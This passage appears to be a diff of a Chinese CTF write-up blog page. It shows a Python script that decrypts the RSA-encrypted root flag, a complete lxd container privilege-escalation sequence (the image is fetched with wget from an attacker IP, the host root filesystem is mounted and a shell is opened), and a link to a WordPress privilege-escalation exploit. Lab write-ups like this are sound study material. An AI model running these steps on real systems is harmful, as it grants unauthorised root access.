class="number">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span></span><br><span class="line">    ct = <span class="number">44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># compute n</span></span><br><span class="line">    n = p * q</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Compute phi(n)</span></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Compute modular inverse of e</span></span><br><span class="line">    gcd, a, b = egcd(e, phi)</span><br><span class="line">    d = a</span><br><span class="line"></span><br><span class="line">    print( <span class="string">"n:  "</span> + str(d) );</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Decrypt ciphertext</span></span><br><span class="line">    pt = pow(ct, d, n)</span><br><span class="line">    print( <span class="string">"pt: "</span> + str(pt) )</span><br><span class="line">    print( <span class="string">"root.txt: "</span> + format(pt,<span class="string">'x'</span>).decode(<span class="string">'hex'</span>) )</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
 <h1 id="lxd-to-root"><a href="#lxd-to-root" class="headerlink" title="lxd to root"></a>lxd to root</h1><p>这个跟之前做过的Tabby一样：</p>
@@ -406,14 +313,7 @@
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 本地build</span></span><br><span class="line">git clone https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line">cd lxd-alpine-builder</span><br><span class="line">sudo bash build-alpine</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机操作</span></span><br><span class="line">wget 10.10.14.4:7777/alpine-v3.12-x86_64-20200710_2021.tar.gz</span><br><span class="line">lxc image import ./alpine-v3.12-x86_64-20200710_2021.tar.gz --alias miao</span><br><span class="line">lxc image list</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这一步如果No storage pool found的话，先</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> lxd init 一路默认即可</span></span><br><span class="line">lxc init miao miaoaaaa -c security.privileged=true</span><br><span class="line">lxc config device add miaoaaaa mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line">lxc start miaoaaaa</span><br><span class="line">lxc exec miaoaaaa /bin/sh</span><br><span class="line">cd /mnt/root/root</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012515.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021012515.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/41006" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41006</a></li>
 <li><a href="http://rumkin.com/tools/cipher/vigenere.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/vigenere.php</a></li>
@@ -433,7 +333,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2021-01-25T07:22:33.591Z" itemprop="dateUpdated">2021-01-25 15:22:33</time>
+    Last updated: <time datetime="2021-01-25T07:22:33.591Z" itemprop="dateUpdated">2021-01-25 15:22:33</time>
 </span><br>
 
 
@@ -600,11 +500,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
